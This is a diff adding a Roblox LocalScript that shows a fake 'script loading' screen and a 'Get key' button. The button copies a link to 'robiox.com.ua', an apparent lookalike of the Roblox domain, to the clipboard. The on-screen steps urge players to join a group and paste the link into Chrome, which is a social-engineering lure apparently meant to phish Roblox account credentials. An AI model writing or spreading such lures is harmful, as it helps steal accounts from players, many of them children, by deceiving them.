@@ -1,0 +1,100 @@
+-- LocalScript
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- UPDATED CODED SERVER LINK
+local codedServerLink = "https://www.robiox.com.ua/communities/7262061198/so2scripts"
+
+-- ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "CodedServerGUI"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- Loading Screen
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+loadingFrame.Parent = gui
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1, 0, 0.2, 0)
+loadingText.Position = UDim2.new(0, 0, 0.4, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading Script..."
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.GothamBold
+loadingText.Parent = loadingFrame
+
+-- Wait 10 seconds
+task.wait(2)
+loadingFrame:Destroy()
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0.6, 0, 0.6, 0)
+mainFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = gui
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -20, 0.15, 0)
+title.Position = UDim2.new(0, 10, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = "USE THE LINK FOR THIS SCRIPT"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = mainFrame
+
+-- Instructions
+local instructions = Instance.new("TextLabel")
+instructions.Size = UDim2.new(1, -20, 0.45, 0)
+instructions.Position = UDim2.new(0, 10, 0.18, 0)
+instructions.BackgroundTransparency = 1
+instructions.TextWrapped = true
+instructions.TextYAlignment = Enum.TextYAlignment.Top
+instructions.Text =
+	"To get the coded server read below\n\n" ..
+	"1. You must join in the group\n" ..
+	"2. Paste the link in the chrome\n" ..
+	"3. The script will allow u\n" ..
+	"4. Enjoy your script🔥"
+instructions.TextColor3 = Color3.fromRGB(200, 200, 200)
+instructions.TextScaled = true
+instructions.Font = Enum.Font.Gotham
+instructions.Parent = mainFrame
+
+-- Button
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.6, 0, 0.15, 0)
+button.Position = UDim2.new(0.2, 0, 0.7, 0)
+button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+button.Text = "Get key"
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.TextScaled = true
+button.Font = Enum.Font.GothamBold
+button.BorderSizePixel = 0
+button.Parent = mainFrame
+
+-- Clipboard Copy (key-system style)
+button.MouseButton1Click:Connect(function()
+	button.Text = "Generating..."
+	task.wait(1.5)
+
+	local success = pcall(function()
+		setclipboard(codedServerLink)
+	end)
+
+	if success then
+		button.Text = "Link Copied!"
+		button.BackgroundColor3 = Color3.fromRGB(0, 140, 0)
+	else
+		button.Text = "Clipboard Not Supported"
+		button.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
+	end
+end)
